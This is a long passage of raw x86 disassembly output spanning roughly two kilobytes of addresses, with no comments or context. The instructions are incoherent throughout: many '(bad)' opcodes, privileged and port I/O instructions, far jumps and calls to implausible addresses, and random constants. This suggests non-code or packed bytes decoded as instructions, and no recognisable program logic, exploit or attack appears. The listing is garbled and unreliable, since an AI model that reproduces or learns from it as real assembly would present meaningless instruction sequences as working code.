  419664:	xchg   ecx,eax
  419665:	repnz daa 
  419667:	inc    esi
  419668:	dec    ebx
  419669:	mov    bl,0xf9
  41966b:	sub    esi,DWORD PTR [eax]
  41966d:	mov    DWORD PTR [ecx-0x12c54a13],esp
  419673:	test   BYTE PTR [edx-0x533a721a],0xb6
  41967a:	pop    ds
  41967b:	es fstp st(5)
  41967e:	sub    cl,BYTE PTR ds:0xfe71231a
  419684:	xor    eax,0xaad1fcfd
  419689:	iret   
  41968a:	icebp  
  41968b:	addr16 mov dl,ah
  41968e:	outs   dx,BYTE PTR ds:[esi]
  41968f:	and    ebp,DWORD PTR [ecx+0x35]
  419692:	and    eax,0x1fd9f949
  419697:	iret   
  419698:	adc    BYTE PTR [ebp+0x59c6a60f],ah
  41969e:	outs   dx,DWORD PTR ss:[esi]
  4196a0:	(bad)  
  4196a1:	jmp    0x7c2e8bce
  4196a6:	pop    edx
  4196a7:	sub    eax,0x867f4115
  4196ac:	fld    TBYTE PTR [esi+0x40]
  4196af:	mov    cl,0x11
  4196b1:	mov    eax,ds:0xdbd78fe
  4196b6:	inc    eax
  4196b7:	adc    DWORD PTR [eax+0x36],ebp
  4196ba:	dec    edx
  4196bb:	mov    cl,0x10
  4196bd:	out    dx,al
  4196be:	lods   eax,DWORD PTR ds:[esi]
  4196bf:	ja     0x41967b
  4196c1:	jp     0x419736
  4196c3:	outs   dx,DWORD PTR ds:[esi]
  4196c4:	push   esp
  4196c5:	sbb    ebx,ecx
  4196c7:	rcr    bl,0x37
  4196ca:	nop
  4196cb:	aaa    
  4196cc:	inc    ebp
  4196cd:	xlat   BYTE PTR ds:[ebx]
  4196ce:	push   esi
  4196cf:	xor    ch,BYTE PTR [edx]
  4196d1:	dec    edi
  4196d2:	imul   BYTE PTR [edi+0x487a4bc0]
  4196d8:	aad    0xe
  4196da:	mov    eax,0xc4a2e89a
  4196df:	push   ebp
  4196e0:	xchg   ecx,eax
  4196e1:	adc    esp,DWORD PTR [ebp+0x6a]
  4196e4:	add    edx,esi
  4196e6:	cmp    DWORD PTR [esi+0x3fb59d87],esi
  4196ec:	xchg   esp,eax
  4196ed:	popa   
  4196ee:	cmp    ebx,DWORD PTR [ebx+0x1f]
  4196f1:	or     dh,BYTE PTR [eax+0x255b82a7]
  4196f7:	sub    eax,0xb79b8fda
  4196fc:	push   ds
  4196fd:	aad    0x5c
  4196ff:	mov    bh,0x10
  419701:	sbb    al,0xbb
  419703:	push   esp
  419704:	lea    ebx,[ebp+ebx*1-0x43]
  419708:	xor    ebp,DWORD PTR [edi-0x77b60faa]
  41970e:	(bad)  
  41970f:	out    dx,eax
  419710:	mov    bl,0xd4
  419712:	and    ebx,ecx
  419714:	pop    esi
  419715:	mov    al,0xca
  419717:	fistp  QWORD PTR [esi+0x7a2cecbe]
  41971d:	test   al,0x42
  41971f:	repz or eax,DWORD PTR [eax-0x68fe4f87]
  419726:	jmp    FWORD PTR [ebp+0x1ccd79d9]
  41972c:	gs and ah,dl
  41972f:	sti    
  419730:	jmp    0x39a2717f
  419735:	ds push ebx
  419737:	add    eax,0x649d4ffd
  41973c:	test   al,0x5e
  41973e:	jmp    0xd72a:0xc0357fe7
  419745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419746:	nop
  419747:	mov    edi,0x3ae34c92
  41974c:	ja     0x419788
  41974e:	jl     0x419748
  419750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419751:	out    0xd4,al
  419753:	and    ecx,DWORD PTR [eax]
  419755:	sbb    eax,0x395908bd
  41975a:	sti    
  41975b:	mov    ecx,0x82dce290
  419760:	imul   esi,DWORD PTR [ebx],0x49
  419763:	fidiv  DWORD PTR [edi-0x1f]
  419766:	mov    bl,0x55
  419768:	xor    BYTE PTR [eax+ebx*8-0x59],ah
  41976c:	leave  
  41976d:	mov    al,0x40
  41976f:	lock mov ah,0x1b
  419772:	ss clc 
  419774:	mov    ds:0xb024401c,eax
  419779:	sbb    eax,0xb4ea3347
  41977e:	mov    ds:0x5be74e70,al
  419783:	jge    0x419756
  419785:	cmp    eax,0xb6c98f8d
  41978a:	into   
  41978b:	adc    al,BYTE PTR [ebx]
  41978d:	dec    edx
  41978e:	mov    ds:0x73cc9fcc,al
  419793:	je     0x4197ed
  419795:	push   ecx
  419796:	push   ss
  419797:	mov    dl,0xa9
  419799:	sub    DWORD PTR [edx-0x43],edx
  41979c:	rcr    BYTE PTR [ebp-0x3312fb3b],cl
  4197a2:	xor    DWORD PTR [eax-0x36],esi
  4197a5:	cmp    DWORD PTR [eax],eax
  4197a7:	adc    al,0xee
  4197a9:	adc    al,0x95
  4197ab:	js     0x419798
  4197ad:	loopne 0x4197f3
  4197af:	pop    es
  4197b0:	add    ebx,DWORD PTR [edi-0x45cedb83]
  4197b6:	mov    bl,0x93
  4197b8:	mov    dh,0x42
  4197ba:	repnz rcl DWORD PTR ds:0x893b0618,1
  4197c1:	aam    0x6d
  4197c3:	popf   
  4197c4:	shl    BYTE PTR [edi+edi*4],1
  4197c7:	outs   dx,DWORD PTR ds:[esi]
  4197c8:	inc    ebp
  4197c9:	(bad)  
  4197cc:	push   edi
  4197cd:	pop    ebx
  4197ce:	jb     0x41975f
  4197d0:	mov    eax,ds:0xea55aed5
  4197d5:	inc    esp
  4197d6:	mov    ebp,0x38b3ccfa
  4197db:	fimul  WORD PTR [esi+0x24]
  4197de:	xchg   edi,eax
  4197df:	xchg   edx,eax
  4197e0:	in     al,0xaa
  4197e2:	imul   edi,edi,0x45
  4197e5:	rcl    DWORD PTR [ebp-0x77e3a933],1
  4197eb:	ds and al,0xe9
  4197ee:	ss sub ecx,esi
  4197f1:	ss in  eax,0xae
  4197f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197f5:	add    BYTE PTR [ecx+ecx*1-0x21],ah
  4197f9:	adc    DWORD PTR [edi-0x42548a1e],edi
  4197ff:	jle    0x41982e
  419801:	xchg   edi,edx
  419803:	mov    eax,0x3071c156
  419808:	call   0x4d84:0x2125b715
  41980f:	mov    ah,BYTE PTR [eax+0x6bd8a032]
  419815:	xor    BYTE PTR [esi],0x5b
  419818:	cmp    BYTE PTR [ebp-0x2e791da3],ch
  41981e:	stc    
  41981f:	ja     0x419860
  419821:	inc    edx
  419822:	push   ebp
  419823:	lds    ebx,FWORD PTR [ebx+0x70]
  419826:	outs   dx,BYTE PTR ds:[esi]
  419827:	arpl   si,bx
  419829:	cmp    eax,0xd5f9519b
  41982e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41982f:	push   0xffffff85
  419831:	add    edx,ecx
  419833:	dec    eax
  419834:	call   0x48d4:0x2fa160f0
  41983b:	and    esp,DWORD PTR [ebx+0x4e]
  41983e:	lods   eax,DWORD PTR ds:[esi]
  41983f:	dec    esp
  419840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419841:	mov    al,0x66
  419843:	cmc    
  419844:	add    BYTE PTR [edx+0x133457b2],0xdf
  41984b:	jg     0x4198b9
  41984d:	(bad)  
  41984e:	pusha  
  41984f:	dec    ebx
  419850:	(bad)  
  419851:	mov    fs:0xd252442d,eax
  419857:	inc    ebp
  419858:	aaa    
  419859:	lods   eax,DWORD PTR ds:[esi]
  41985a:	cmp    ebp,ebp
  41985c:	js     0x41982c
  41985e:	pop    ds
  41985f:	add    eax,0x8e39d457
  419864:	mov    esi,0x7646bfe2
  419869:	pusha  
  41986a:	int    0xa9
  41986c:	pop    es
  41986d:	aaa    
  41986e:	xor    ebx,eax
  419870:	pop    edi
  419871:	mov    bh,BYTE PTR [eax+0x5d8d9091]
  419877:	pop    es
  419878:	(bad)  
  419879:	dec    DWORD PTR ds:0x3a16e8f7
  41987f:	inc    esi
  419880:	sub    al,0x96
  419882:	jae    0x419884
  419884:	outs   dx,BYTE PTR ds:[esi]
  419885:	ret    0x7468
  419888:	and    BYTE PTR [ebx+ebx*1+0x50c04f18],ch
  41988f:	shl    BYTE PTR [ebx],1
  419891:	sbb    ebp,DWORD PTR ds:0x5577264f
  419897:	push   eax
  419898:	fisub  WORD PTR [eax+0x7694b20f]
  41989e:	pusha  
  41989f:	and    BYTE PTR [ebp+0x15a42961],bh
  4198a5:	or     esp,DWORD PTR [edi-0x6c]
  4198a8:	push   ebp
  4198a9:	sbb    edi,DWORD PTR [ebx]
  4198ab:	adc    eax,ecx
  4198ad:	in     eax,0x56
  4198af:	push   esp
  4198b0:	or     al,0x70
  4198b2:	dec    edx
  4198b3:	push   0xecd86320
  4198b8:	(bad)  
  4198b9:	ss stos BYTE PTR es:[edi],al
  4198bb:	pop    es
  4198bc:	les    esi,FWORD PTR [edx+0x2b]
  4198bf:	lock jo 0x419893
  4198c2:	test   DWORD PTR [ecx],ecx
  4198c4:	jb     0x4198e3
  4198c6:	pop    edx
  4198c7:	(bad)  
  4198c8:	adc    eax,0x1e4fd4be
  4198cd:	sub    eax,0xc284274e
  4198d2:	fisttp DWORD PTR [ebx]
  4198d4:	mov    ch,0xee
  4198d6:	mov    ss,WORD PTR [edi]
  4198d8:	pop    ss
  4198d9:	pavgw  mm7,QWORD PTR [esi-0x3c]
  4198dd:	xchg   WORD PTR [ebp-0x3b05ec4e],sp
  4198e4:	cmp    al,0x7
  4198e6:	xchg   edx,eax
  4198e7:	mov    DWORD PTR [ecx-0xdc70851],ebx
  4198ed:	fistp  DWORD PTR [bp+si+0x7332]
  4198f2:	cmp    eax,edi
  4198f4:	or     al,0xc4
  4198f6:	mov    dh,0x73
  4198f8:	out    0xcc,eax
  4198fa:	jnp    0x419969
  4198fc:	aad    0x62
  4198fe:	inc    ebp
  4198ff:	popa   
  419900:	jne    0x419929
  419902:	call   0xc8f9:0xcf216cfc
  419909:	xor    eax,esp
  41990b:	and    DWORD PTR [ebp+0x2870d137],ebp
  419911:	mov    ah,0x57
  419913:	sbb    edx,edx
  419915:	in     al,dx
  419916:	and    ebp,DWORD PTR [ecx+0x1c]
  419919:	stos   DWORD PTR es:[edi],eax
  41991a:	nop
  41991b:	aam    0xfe
  41991d:	shr    esp,1
  41991f:	in     al,0xeb
  419921:	cmp    BYTE PTR [ebx-0x5b],0x49
  419925:	inc    esp
  419926:	adc    eax,0x6c869f9c
  41992b:	jbe    0x4198c8
  41992d:	repz fidiv DWORD PTR ds:0xd1bf7172
  419934:	jo     0x41996e
  419936:	mov    BYTE PTR [edi-0xe],bl
  419939:	arpl   WORD PTR [esi+0x8],dx
  41993c:	jbe    0x4198ca
  41993e:	and    ch,BYTE PTR [edi]
  419940:	add    eax,0x997f3214
  419945:	sub    bl,0xc0
  419948:	sub    dl,BYTE PTR [ecx+0x77]
  41994b:	nop
  41994c:	es fsubp st(1),st
  41994f:	pop    ds
  419950:	adc    eax,0x35c6b842
  419955:	mov    ch,0x27
  419957:	sbb    edx,DWORD PTR [ebp+0x71]
  41995a:	cmp    BYTE PTR [edi+0x30],0x13
  41995e:	pop    es
  41995f:	push   cs
  419960:	xchg   esi,eax
  419961:	push   ds
  419962:	dec    ebx
  419963:	repz imul esp,DWORD PTR [esi-0x758251f1],0xffffffac
  41996b:	push   ecx
  41996c:	cmp    BYTE PTR [edi-0x66],0x5d
  419970:	jmp    0x240fb716
  419975:	outs   dx,DWORD PTR ds:[esi]
  419976:	dec    ecx
  419977:	pop    eax
  419978:	cmp    eax,0x6f183076
  41997d:	push   ebx
  41997e:	sub    bl,ch
  419980:	mov    DWORD PTR [edx-0x66],edi
  419983:	call   0xa151:0x2f4ad71d
  41998a:	bound  ebx,QWORD PTR ds:0x80efe32d
  419990:	jg     0x41993a
  419992:	cmp    BYTE PTR [edi+0x6362c80a],bh
  419998:	in     al,dx
  419999:	pop    edx
  41999a:	jb     0x41997b
  41999c:	mov    esi,0xe3495851
  4199a1:	jecxz  0x419967
  4199a3:	add    eax,DWORD PTR [esi+esi*2-0x3]
  4199a7:	ja     0x41999b
  4199a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199aa:	cs in  eax,dx
  4199ac:	xlat   BYTE PTR ds:[ebx]
  4199ad:	pop    ds
  4199ae:	pop    edx
  4199af:	xor    ah,BYTE PTR [edx]
  4199b1:	pushf  
  4199b2:	jp     0x419956
  4199b4:	je     0x419a30
  4199b6:	das    
  4199b7:	jbe    0x419a31
  4199b9:	dec    ecx
  4199ba:	mov    ah,0x68
  4199bc:	cmp    edx,DWORD PTR [edi]
  4199be:	jp     0x4199a4
  4199c0:	xor    BYTE PTR [edx-0x35],dl
  4199c3:	xor    dh,BYTE PTR [ebp+eiz*8+0xebe38d0]
  4199ca:	pop    edx
  4199cb:	push   cs
  4199cc:	fisttp DWORD PTR [edx]
  4199ce:	sti    
  4199cf:	sub    al,0x1f
  4199d1:	mov    edx,0x464eeb5d
  4199d6:	inc    edx
  4199d7:	mov    al,ds:0x2496a3b6
  4199dc:	or     eax,0x8b28013b
  4199e1:	rcr    BYTE PTR [ebp+0x45],cl
  4199e4:	or     edi,DWORD PTR [esi]
  4199e6:	add    BYTE PTR [ebx+ebp*2+0x9],0x0
  4199eb:	xor    eax,esp
  4199ed:	xchg   ecx,ebp
  4199ef:	ret    0x1c00
  4199f2:	mov    ds:0xccfb2a8b,eax
  4199f7:	in     al,0x6f
  4199f9:	lahf   
  4199fa:	and    BYTE PTR [ebp-0x74385d13],bh
  419a00:	imul   ebp,DWORD PTR fs:[ecx],0x7cf9d216
  419a07:	dec    ecx
  419a08:	add    BYTE PTR [edi-0x61],al
  419a0b:	inc    BYTE PTR [ebx-0x6]
  419a0e:	jle    0x4199bf
  419a10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a11:	push   es
  419a12:	ins    DWORD PTR es:[edi],dx
  419a13:	jb     0x4199c9
  419a15:	jle    0x419a40
  419a17:	or     eax,0xab2e08e3
  419a1c:	add    bh,BYTE PTR [eax]
  419a1e:	sub    eax,DWORD PTR [edx]
  419a20:	xchg   ecx,eax
  419a21:	adc    ebx,DWORD PTR [eax-0x2a]
  419a24:	adc    DWORD PTR [edx-0x3fb9840f],0xa38455df
  419a2e:	lgdtd  [edx-0x71c75224]
  419a35:	adc    DWORD PTR [ebp-0x7794f0b9],esi
  419a3b:	dec    ebx
  419a3c:	(bad)  
  419a3d:	cmp    ecx,DWORD PTR [ebp-0x6ed208da]
  419a43:	jl     0x419a2d
  419a45:	lods   eax,DWORD PTR ds:[esi]
  419a46:	repz in al,dx
  419a48:	ficomp DWORD PTR [ebp-0x6b974e50]
  419a4e:	sbb    ch,BYTE PTR [ebx]
  419a50:	mov    ch,0x77
  419a52:	dec    esp
  419a53:	xlat   BYTE PTR ds:[ebx]
  419a54:	int3   
  419a55:	pop    ebp
  419a56:	mov    edx,0xef6975be
  419a5b:	fs hlt 
  419a5d:	jmp    0xb89e2b78
  419a62:	mov    bh,0x77
  419a64:	or     ebp,DWORD PTR [esi+0x35c8cc8e]
  419a6a:	sub    DWORD PTR [ebp+0x61717af5],ebx
  419a70:	cmp    DWORD PTR [ebx-0x79],esi
  419a73:	imul   esi,DWORD PTR [edi-0x72e688e0],0xcd54078b
  419a7d:	sbb    al,0x9d
  419a7f:	ja     0x419ae0
  419a81:	adc    DWORD PTR [esi-0x2d59a58c],ecx
  419a87:	add    DWORD PTR [esi-0x2a35c58e],esp
  419a8d:	imul   ecx,DWORD PTR ds:0x831c,0x9c8c9b22
  419a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a97:	jmp    0x419b15
  419a99:	cmp    dl,BYTE PTR [eax]
  419a9b:	xor    edx,DWORD PTR [ebp+0xdf9b271]
  419aa1:	lods   al,BYTE PTR gs:[esi]
  419aa3:	dec    ebp
  419aa4:	(bad)  
  419aa5:	jmp    0x419a8a
  419aa7:	add    DWORD PTR [ecx-0x9],esi
  419aaa:	fwait
  419aab:	std    
  419aac:	pop    esi
  419aad:	jg     0x419a40
  419aaf:	push   ss
  419ab0:	es je  0x419a8b
  419ab3:	xlat   BYTE PTR ds:[ebx]
  419ab4:	mov    ch,0x44
  419ab6:	imul   edx,DWORD PTR [edi+ecx*4+0x6d52a1a],0x3b
  419abe:	mov    edi,0x6aed31fd
  419ac3:	stc    
  419ac4:	sbb    al,0x83
  419ac6:	aad    0xaa
  419ac8:	add    bh,ah
  419aca:	retf   0x9be
  419acd:	rcr    DWORD PTR [esi-0x6c04af47],0xc1
  419ad4:	mov    edx,0xf4426f47
  419ad9:	retf   0xb86
  419adc:	retf   0x1953
  419adf:	in     eax,0x25
  419ae1:	xchg   esi,eax
  419ae2:	in     eax,dx
  419ae3:	loop   0x419a6a
  419ae5:	jns    0x419a91
  419ae7:	push   ss
  419ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ae9:	stos   BYTE PTR es:[edi],al
  419aea:	xor    esp,esi
  419aec:	nop
  419aed:	jmp    0x419b2a
  419aef:	iret   
  419af0:	neg    DWORD PTR es:[edi-0x11183d8]
  419af7:	mov    al,0xa3
  419af9:	and    al,0x79
  419afb:	add    edi,ecx
  419afd:	and    eax,DWORD PTR [ebp-0x52]
  419b00:	cwde   
  419b01:	fstp   TBYTE PTR [esi-0x4470d808]
  419b07:	aas    
  419b08:	mov    cl,0x6f
  419b0a:	ret    0xb8ee
  419b0d:	fsub   DWORD PTR [bp+si+0x65]
  419b11:	(bad)  
  419b12:	pop    ss
  419b13:	or     DWORD PTR [ebx],ecx
  419b15:	push   es
  419b16:	popa   
  419b17:	addr16 dec ebp
  419b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b1a:	cld    
  419b1b:	test   BYTE PTR [ebx-0x6b],ah
  419b1e:	lock dec ecx
  419b21:	dec    esi
  419b22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b23:	jg     0x419ae2
  419b25:	jecxz  0x419b40
  419b27:	cs jmp 0xfaef:0x12f73473
  419b2f:	xchg   edi,eax
  419b30:	imul   eax,DWORD PTR [ebp+0xb],0xffffffde
  419b34:	rcl    BYTE PTR [esi-0x69],cl
  419b37:	(bad)
  419b3a:	scas   eax,DWORD PTR es:[edi]
  419b3b:	dec    ebp
  419b3c:	repz cmp eax,0xe334219d
  419b42:	fwait
  419b43:	mov    es,WORD PTR [edi+0xaa30f89]
  419b49:	and    esp,DWORD PTR [edx-0x6d]
  419b4c:	jmp    0x39c8219f
  419b51:	sahf   
  419b52:	add    BYTE PTR [edi-0x1],cl
  419b55:	out    0xf1,eax
  419b57:	pop    ebx
  419b58:	mov    ebp,0x81f45f04
  419b5d:	das    
  419b5e:	xlat   BYTE PTR ds:[ebx]
  419b5f:	and    eax,0x1962fa98
  419b64:	mov    ds:0x9c5fc771,eax
  419b69:	les    ebx,FWORD PTR [ebx]
  419b6b:	imul   ecx,edx,0xbde1ad76
  419b71:	dec    edx
  419b72:	push   esi
  419b73:	add    bl,cl
  419b75:	fadd   DWORD PTR ds:0xe2677fe
  419b7b:	pop    ds
  419b7c:	dec    esp
  419b7d:	mov    ebx,esi
  419b7f:	mov    bh,0x18
  419b81:	cmp    ebp,DWORD PTR ds:0x485307be
  419b87:	icebp  
  419b88:	sub    eax,0x6bcbac6f
  419b8d:	or     edx,DWORD PTR [esi+edi*8+0x4756b8b]
  419b94:	daa    
  419b95:	mov    dh,0x64
  419b97:	dec    DWORD PTR [ebx+0x71d2ad63]
  419b9d:	mov    edi,DWORD PTR [ebx-0x499925eb]
  419ba3:	push   esp
  419ba4:	(bad)  
  419ba5:	shl    BYTE PTR [ecx-0x3e4d0f52],1
  419bab:	adc    ecx,DWORD PTR [esi*8-0x3c04e0d8]
  419bb2:	adc    edx,ecx
  419bb4:	xchg   esi,eax
  419bb5:	inc    esp
  419bb6:	xchg   BYTE PTR ds:0x31f383e5,ch
  419bbc:	add    eax,0xecca1658
  419bc1:	je     0x419bae
  419bc3:	imul   esp,DWORD PTR [edx-0x44],0x2c
  419bc7:	adc    ebp,ebx
  419bc9:	imul   ecx,DWORD PTR [edi],0xd6167463
  419bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bd0:	loope  0x419b71
  419bd2:	sbb    eax,0x7847d2ca
  419bd7:	dec    esp
  419bd8:	jns    0x419bb5
  419bda:	(bad)  
  419bdb:	(bad)  
  419bdd:	jp     0x419bfc
  419bdf:	cmp    DWORD PTR [edi-0x75],0x5a
  419be3:	add    dh,ch
  419be5:	adc    al,0x50
  419be7:	xor    ch,bl
  419be9:	data16 repz icebp 
  419bec:	sub    DWORD PTR [ebx+0x696648e0],eax
  419bf2:	mov    ds:0x90b34190,eax
  419bf7:	cmc    
  419bf8:	cs shl ah,1
  419bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bfc:	out    0xfb,eax
  419bfe:	out    dx,al
  419bff:	dec    esp
  419c00:	dec    edi
  419c01:	cmp    edx,ebx
  419c03:	fadd   QWORD PTR [esp+ecx*8-0x68247b11]
  419c0a:	addr16 in eax,dx
  419c0c:	xchg   dh,dl
  419c0e:	xchg   ebp,eax
  419c0f:	stos   BYTE PTR es:[edi],al
  419c10:	(bad)  
  419c11:	cmp    eax,0xc2dc1df6
  419c16:	ds leave 
  419c18:	sbb    eax,0x2890c34f
  419c1d:	push   ebp
  419c1e:	inc    eax
  419c1f:	dec    eax
  419c20:	rol    DWORD PTR [si-0x7a3e],1
  419c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c26:	push   ebx
  419c27:	imul   esp,ecx,0xffffffbd
  419c2a:	sub    ecx,edx
  419c2c:	out    dx,eax
  419c2d:	mov    al,0x23
  419c2f:	lds    esi,FWORD PTR [edi]
  419c31:	sti    
  419c32:	dec    esi
  419c33:	jmp    DWORD PTR [ecx]
  419c35:	lds    edx,FWORD PTR [esp+ecx*1-0x5e]
  419c39:	xchg   esp,ecx
  419c3b:	cmp    al,0x5e
  419c3d:	cld    
  419c3e:	inc    ecx
  419c3f:	or     BYTE PTR [ebx+0x2d124575],dh
  419c45:	and    esi,0xffffffa7
  419c48:	dec    edx
  419c49:	rcr    BYTE PTR [edi-0x53],0x40
  419c4d:	jo     0x419c94
  419c4f:	mov    WORD PTR [ebp+0x75],fs
  419c52:	push   esp
  419c53:	fwait
  419c54:	lea    ebp,ds:0x8aa15315
  419c5a:	sub    ecx,edx
  419c5c:	or     esi,DWORD PTR [ebx]
  419c5e:	inc    DWORD PTR [ecx-0x58]
  419c61:	call   0xf902:0xb03c6abe
  419c68:	es popa 
  419c6a:	xor    al,0x86
  419c6c:	pop    ebp
  419c6d:	xor    eax,0xfa0303a7
  419c72:	retf   0xdf03
  419c75:	xchg   ebx,eax
  419c76:	sub    al,0xc7
  419c78:	or     esi,ecx
  419c7a:	pop    ebx
  419c7b:	mov    esi,DWORD PTR [esi+esi*1-0x50]
  419c7f:	mul    BYTE PTR [esi-0x76]
  419c82:	(bad)  
  419c83:	fidivr WORD PTR [ebp+0x6d]
  419c86:	das    
  419c87:	cmp    eax,0x67be878c
  419c8c:	add    DWORD PTR [edx],esi
  419c8e:	int3   
  419c8f:	jl     0x419c9c
  419c91:	pop    esp
  419c92:	arpl   WORD PTR [edx],dx
  419c94:	fld    QWORD PTR [ebx+0x6a]
  419c97:	cld    
  419c98:	xchg   bl,ch
  419c9a:	sub    eax,DWORD PTR [ecx]
  419c9c:	sbb    BYTE PTR [ebx+0x28],al
  419c9f:	sbb    DWORD PTR [edi],esp
  419ca1:	push   esp
  419ca2:	pushf  
  419ca3:	sbb    al,0x21
  419ca5:	mov    ch,0xae
  419ca7:	lahf   
  419ca8:	xchg   esp,eax
  419ca9:	xor    bl,BYTE PTR [edx-0x6922afd7]
  419caf:	cld    
  419cb0:	stos   BYTE PTR es:[edi],al
  419cb1:	ffreep st(5)
  419cb3:	hlt    
  419cb4:	jb     0x419cd8
  419cb6:	jl     0x419d1b
  419cb8:	loope  0x419c50
  419cba:	sub    al,0x81
  419cbc:	jmp    0xc06dca9f
  419cc1:	mov    esp,0x8bebb5e4
  419cc6:	neg    DWORD PTR [ebx]
  419cc8:	adc    ebx,DWORD PTR ss:[ebx-0x1b]
  419ccc:	test   eax,0xedee0095
  419cd1:	stos   DWORD PTR es:[edi],eax
  419cd2:	int    0x3e
  419cd4:	(bad)
  419cd8:	std    
  419cd9:	and    cl,BYTE PTR [edi-0x3d915f7e]
  419cdf:	js     0x419cab
  419ce1:	test   ecx,0xda4483eb
  419ce7:	daa    
  419ce8:	or     edx,esi
  419cea:	lock adc DWORD PTR [ebx+esi*2],ebx
  419cee:	sbb    bl,bh
  419cf0:	loope  0x419cc4
  419cf2:	bound  edi,QWORD PTR [eax+eiz*2]
  419cf5:	and    eax,DWORD PTR [edi+0x65]
  419cf8:	fwait
  419cf9:	jle    0x419ca9
  419cfb:	mov    edi,ecx
  419cfd:	xor    al,0x3d
  419cff:	iret   
  419d00:	in     eax,0x60
  419d02:	mov    dl,0xc
  419d04:	mov    edi,0xa3784e3b
  419d09:	or     dh,BYTE PTR [eax+0x1c]
  419d0c:	pandn  mm7,QWORD PTR [ebx+edi*1-0x319a3e77]
  419d14:	push   0x4b189b6b
  419d19:	mov    WORD PTR [ebx],ss
  419d1b:	in     eax,dx
  419d1c:	je     0x419d59
  419d1e:	sbb    eax,0x70738699
  419d23:	pop    es
  419d24:	jnp    0x419ce7
  419d26:	pop    ebx
  419d27:	repnz pop esp
  419d29:	jo     0x419cd7
  419d2b:	mov    edx,0x5fba441f
  419d30:	(bad)  
  419d31:	xor    ch,bl
  419d33:	aas    
  419d34:	pop    esp
  419d35:	les    eax,FWORD PTR [esi]
  419d37:	xchg   DWORD PTR [ebx-0x54],esp
  419d3a:	push   esi
  419d3b:	sub    al,bl
  419d3d:	mov    edi,0x5228105c
  419d42:	fisttp QWORD PTR [ebx+0x2f7f1fae]
  419d48:	int    0xfc
  419d4a:	dec    edx
  419d4b:	ins    BYTE PTR es:[edi],dx
  419d4c:	pop    ds
  419d4d:	adc    BYTE PTR [edi],dl
  419d4f:	stc    
  419d50:	lock call 0x16910dbf
  419d56:	dec    edi
  419d57:	in     eax,dx
  419d58:	cmp    al,BYTE PTR [esi+eiz*2+0xc]
  419d5c:	shl    DWORD PTR [si-0x67f3],0x7b
  419d62:	dec    ebx
  419d63:	sub    al,0x28
  419d65:	xchg   ebp,eax
  419d66:	and    BYTE PTR [ebx+0x28],al
  419d69:	mov    ah,0xce
  419d6b:	add    eax,0xdeb74e3
  419d70:	inc    esi
  419d71:	mov    cl,0xa1
  419d73:	xor    BYTE PTR [ecx+ecx*1],dl
  419d76:	push   ebp
  419d77:	aad    0x0
  419d79:	stos   BYTE PTR es:[edi],al
  419d7a:	scas   eax,DWORD PTR es:[edi]
  419d7b:	sbb    DWORD PTR [esp+edi*1+0x78],edx
  419d7f:	into   
  419d80:	sub    al,0xe3
  419d82:	out    0x26,eax
  419d84:	and    eax,0x34f1b208
  419d89:	lods   al,BYTE PTR ds:[esi]
  419d8a:	add    BYTE PTR [esi-0xcc87ce5],ah
  419d90:	mov    dl,0x5e
  419d92:	sbb    al,0xd4
  419d94:	and    eax,0x1bb6ec6a
  419d99:	daa    
  419d9a:	cli    
  419d9b:	mov    ebp,0x7d93b34b
  419da0:	add    eax,0x655f058e
  419da5:	mov    ds:0x8c6c70fc,al
  419daa:	dec    ebp
  419dab:	pop    ebp
  419dac:	nop
  419dad:	or     BYTE PTR [edx+0x2e75bf8e],cl
  419db3:	inc    ebp
  419db4:	add    al,0x4a
  419db6:	and    al,0x7
  419db8:	push   eax
  419db9:	pop    ebp
  419dba:	mov    ebx,0x2278fdf7
  419dbf:	push   0x60
  419dc1:	jae    0x419da4
  419dc3:	sahf   
  419dc4:	cmp    ecx,DWORD PTR [ecx]
  419dc6:	(bad)  
  419dc8:	ret    
  419dc9:	mov    dh,0x6c
  419dcb:	gs mov ecx,0x188b8845
  419dd1:	sbb    DWORD PTR [ecx-0x7],ebp
  419dd4:	mov    ebx,0xadaf9331
  419dd9:	in     al,dx
  419dda:	inc    ecx
  419ddb:	mov    bh,0x85
  419ddd:	aas    
  419dde:	dec    ecx
  419ddf:	mov    ebp,0xdb585c4a
  419de4:	sub    al,0x14
  419de6:	cmp    eax,0x192280
  419deb:	cdq    
  419dec:	lahf   
  419ded:	test   eax,0xb98ac829
  419df2:	fwait
  419df3:	mov    ecx,0x6ff9994d
  419df8:	sub    eax,0x7a0d98a2
  419dfd:	add    al,0x3f
  419dff:	repz imul ebx,DWORD PTR [ebx],0x28
  419e03:	inc    ebp
  419e04:	int3   
  419e05:	out    dx,al
  419e06:	cmp    DWORD PTR ds:0x83939b70,edi
  419e0c:	popa   
  419e0d:	pop    ss
  419e0e:	mov    cl,0xd5
  419e10:	push   esi
  419e11:	xchg   edx,eax
  419e12:	sbb    ch,BYTE PTR [eax+esi*8]
  419e15:	test   edi,edi
  419e17:	scas   eax,DWORD PTR es:[edi]
  419e18:	sbb    cl,BYTE PTR [edx+0x6c]
  419e1b:	push   edi
  419e1c:	sbb    DWORD PTR ds:0xa15dcd4d,esp
  419e22:	pop    esi
  419e23:	and    BYTE PTR ss:[ecx],ch
  419e26:	fwait
  419e27:	mov    ds:0xcbb1d90d,eax
  419e2c:	xor    eax,0x89c7e060
  419e31:	popf   
  419e32:	push   edx
  419e33:	mov    edx,0xd9d198ff
  419e38:	jecxz  0x419e50
  419e3a:	xor    edx,DWORD PTR [ebx+esi*2-0x24ec77b9]
  419e41:	jle    0x419e33
  419e43:	aas    
  419e44:	xor    ebp,DWORD PTR [eiz*1-0xef99dec]
  419e4b:	popf   
  419e4c:	cli    
  419e4d:	in     al,0x6a
  419e4f:	push   esp
  419e50:	lds    esi,FWORD PTR [ecx]
  419e52:	jae    0x419e51
